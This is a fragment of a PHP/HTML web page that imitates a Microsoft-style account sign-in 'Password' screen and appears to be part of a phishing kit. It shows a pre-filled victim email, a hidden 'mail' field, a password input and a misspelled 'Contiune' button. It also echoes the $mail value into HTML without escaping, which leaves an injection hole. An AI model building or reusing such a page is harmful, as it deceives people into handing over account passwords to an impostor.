...
<body>
    ...
    event: {
        backButtonClick: secondaryButton_onClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $mail; ?>"><?php echo $mail; ?></div><!-- ko ifnot: svr.Bw --><!-- /ko --> </div></div>
					<div id="signInTitle" class="row text-title margin-bottom-16" data-bind="text: config.text.header">Password</div>
					...
					<div class="row margin-bottom-16">
						...
						<input type="hidden" name="mail" value="<?php echo $mail; ?>">
							<input type="password" name="password" class="form-control" aria-required="true" aria-label="Email, phone, or Skype" placeholder="Password" data-bind="hasFocus: focus, textInput: email, attr: {'placeholder': config.text.emailPlaceHolder,
				...
				<div class="row inline-block no-margin-top-bottom button-container">
					<input type="submit" class="btn btn-block btn-primary" data-bind="value: config.text.linkNext, click: submit" value="Contiune">
					</form>
				</div>
				<!-- /ko -->
			</main>
